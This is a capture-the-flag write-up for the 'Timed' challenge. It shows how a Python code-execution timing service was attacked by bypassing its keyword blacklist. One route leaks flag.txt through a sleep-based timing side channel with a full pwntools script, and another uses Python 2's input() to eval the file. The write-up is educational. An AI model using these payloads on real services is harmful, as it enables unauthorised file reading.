# Timed
>Written by avz92

>I found this cool program that times how long Python commands take to run! Unfortunately, the owner seems very paranoid, so there's not really much that you can test. The flag is located in the file flag.txt on the server.
```bash
nc p1.tjctf.org 8005
```

Try connect it with netcat:
```py
nc p1.tjctf.org 8005
Type a command to time it!
print('hi')
Runtime: 1.00135803223e-05
```

It seems only output the **execute time** of our Python command

Lets try invalid command:
```py
Type a command to time it!
hi
Traceback (most recent call last):
  File "/timed.py", line 36, in <module>
    time1=t.timeit(1)
  File "/usr/lib/python2.7/timeit.py", line 202, in timeit
    timing = self.inner(it, self.timer)
  File "<timeit-src>", line 6, in inner
    hi
NameError: global name 'hi' is not defined
Runtime: 0
```

An error occurred! Ok lets try more:
```py
Type a command to time it!
import os
Hey, no hacking!
Type a command to time it!
open('flag.txt').read()
Hey, no hacking!
Type a command to time it!
()            
Hey, no hacking!
Type a command to time it!
eval("hi")
Hey, no hacking!
Type a command to time it!
open('flag.txt','r').read(100)
Runtime: 3.19480895996e-05
Type a command to time it!
Traceback (most recent call last):
  File "/timed.py", line 31, in <module>
    t=timeit.Timer(res)
  File "/usr/lib/python2.7/timeit.py", line 143, in __init__
    code = compile(src, dummy_src_name, "exec")
  File "<timeit-src>", line 7
    _t1 = _timer()
      ^
``` 
It just run `exec` on our input based on the error above

It black listed `import` , `eval` and `()` but single bracket can bypass it!

## Intended Solution

As the challenge title, we need to leak the flag using timing attack

We can use `time.sleep()` function, because `time` already imported in the source code:
```
Type a command to time it!
time.sleep(1)
Runtime: 1.00111889839
```
Then based on the Runtime to determine our flag

The most fastest way is to convert the flag in binary and put if its `1` then sleep for some seconds

Written a python payload:
```python
# Loop all flag in binary form
# zfill(7) because ASCII value is at most length 7 in binary
if bin(ord(open('flag.txt','r').read(100)[index]))[2:].zfill(7)[binary_index]=='1':
	# If is 1 then sleep for 0.2 seconds
	time.sleep(0.2)
```

Lets test it!
```
Type a command to time it!
if bin(ord(open('flag.txt','r').read(100)[0]))[2:].zfill(7)[0]=='1':time.sleep(1)         
Runtime: 1.00115013123

```
Looks like the payload is working!

Written [full python script](solve.py) for leaking the full flag:
```py
from pwn import *

p = remote("p1.tjctf.org",8005)
flag = 'tjctf{'
index = 6
while(1):
	temp = ''
	for i in range(7):
		p.sendlineafter("!\n","if bin(ord(open('flag.txt','r').read(100)[{}]))[2:].zfill(7)[{}]=='1':time.sleep(0.2)".format(index,i))
		p.recvuntil("Runtime: ")
		time = p.recvuntil("\n")[:-1]
		if float(time) > 0.2:
			temp += '1'
		else:
			temp += '0'
	index += 1
	flag += chr(int(temp,2))
	print flag
```
Result:
```
[+] Opening connection to p1.tjctf.org on port 8005: Done
tjctf{i
tjctf{iT
tjctf{iTs
tjctf{iTs_
...
tjctf{iTs_T1m3_f0r_a_flaggg
tjctf{iTs_T1m3_f0r_a_flaggg}
```

## Unintended solution

According to the error, it is Python 2.7

In Python 2.7, if we use `input()` function the input will become real syntax (same as eval)

So I tried `input("")`:
```py
Type a command to time it!
input("cmd:")
eval()     
Traceback (most recent call last):
  File "/timed.py", line 36, in <module>
    time1=t.timeit(1)
  File "/usr/lib/python2.7/timeit.py", line 202, in timeit
    timing = self.inner(it, self.timer)
  File "<timeit-src>", line 6, in inner
    input("cmd:")
  File "<string>", line 1, in <module>
TypeError: eval expected at least 1 arguments, got 0
Runtime: 0
```
Looks like we can ran eval! We bypass the blacklist

Then we can execute `eval(content of flag)` then it will show the flag for us because got syntax error

```py
Type a command to time it!
input("")
eval(open('flag.txt','r').read())
Traceback (most recent call last):

  File "/timed.py", line 36, in <module>
    time1=t.timeit(1)
  File "/usr/lib/python2.7/timeit.py", line 202, in timeit
    timing = self.inner(it, self.timer)
  File "<timeit-src>", line 6, in inner
    input("")
  File "<string>", line 1, in <module>
  File "<string>", line 1
    tjctf{iTs_T1m3_f0r_a_flaggg}
         ^
SyntaxError: invalid syntax
Runtime: 0
```
## Flag
```
tjctf{iTs_T1m3_f0r_a_flaggg}
```